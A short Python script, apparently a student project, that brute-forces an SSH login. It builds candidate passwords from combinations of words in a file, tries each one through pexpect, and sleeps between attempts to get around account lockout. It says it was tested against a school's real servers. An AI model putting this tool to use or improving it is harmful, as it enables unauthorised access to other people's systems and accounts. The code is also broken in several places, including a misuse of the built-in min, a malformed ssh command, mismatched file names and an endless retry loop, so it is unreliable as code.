#This is a program that guesses a specific host (server) password. The host address has been removed because it was the schools actual host addresses this was tested on. 
#It is meant to keep trying the SSL with paramaters to beat lock out time
#This is for educational purposes only. 


from cmd import PROMPT

import pexpect, time

def candidates_fun_1(filename):
    f=open(filename, "r")
    candidates =[]
    for line in f.readlines():
        line = line.strip('\n')
        candidates.append(line)
    return candidates


#define the depth of recursion and write the password results

def gen_password(candidates, f):
    min = int(min)
    min = int(min)
    max = input("Define max length: ")
    max = int(max)
    for k in range(min, max+1):
        for ps in fun(candidates, k):
            f.write("".join(ps+"\n"))



def fun(candidates, n):
    if 0 ==n:
        yield []
    else:
        for i in range(len(candidates)):
            for st in fun(candidates, n-1):
                yield [candidates[i]]+st


def send_command(child, com):
    child.sendline(com)


    child.expect(PROMPT)


    print(child.before.decode("UTF-8"))


def connection(user, host, ps):
    str ='ssh' + user + '@' +host

    child = pexpect.spawn(str)

    child.expect(['[P|p]assword: '])

    child.sendline(ps)

    child.expect(PROMPT)

    return child

def userinfo():
    n = 3
    t = 30
    counter = 0

    user = 'ubuntu'
    #This host needs to be filled in for it to work correctly
    host = ''

    file = open("test.pass.txt", 'r')

    counter = 0

    for password in file.readlines():
        password = password.strip('\n')

        while True:

            try:
                connection(user, host, password)
                print("[+] Password Found: " + password + '\n')
                return
            except:
                print("[-] Wrong Password: " + password + '\n')
            counter +=1
            if counter%n ==0:
                wait(t)

def wait(T):
    time.sleep(T*60)

def main ():
    f = open("testpass.txt", 'w')

    can = candidates_fun_1("info.txt")

    gen_password(can, f)

    f.close()

    userinfo()

if __name__ == '__main__':
    main()
